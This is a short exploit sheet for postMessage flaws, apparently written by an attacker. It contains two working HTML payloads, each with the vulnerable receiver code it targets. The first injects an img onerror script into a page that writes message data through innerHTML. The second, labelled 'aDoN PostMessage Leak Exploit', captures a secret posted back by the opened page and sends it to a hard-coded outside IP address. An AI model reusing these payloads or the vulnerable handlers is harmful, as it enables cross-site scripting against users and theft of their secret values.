DOM XSS Payload:


<html>
<body>
<script>
var popup = window.open('http://vulnerable.com');
function post(){popup.postMessage({"id":0,"value":"<img src='x' onerror='alert(document.domain)'>"},"*")}
setInterval(post,1000);
</script>
</body>
</html>



Vulnerable Code:


<script>window.addEventListener("message", function(event){
       document.getElementById("value"+event.data.id).innerHTML = event.data.value;}, false);
 </script>
            
           
<span id="value0">
  blablabla
</span>




-----------------------------------------------------------------

Info Leak Payload:


<html>
<head>
  <script>

      pwn = window.open('http://vulnerable.com/key/0')

      window.addEventListener('message', (event) => {
      
	fetch("http://37.187.112.19:8000/"+event.data.value, { method: 'GET'});
      }, false)

  </script>
</head>
<body>
  <p>aDoN PostMessage Leak Exploit</p>
</body>
</html>




Vulnerable Code:


<html>
<script>
  window.opener.postMessage({"id":0,"value":"21939129iie9r"}, '*');
  window.close();
</script>
</html>





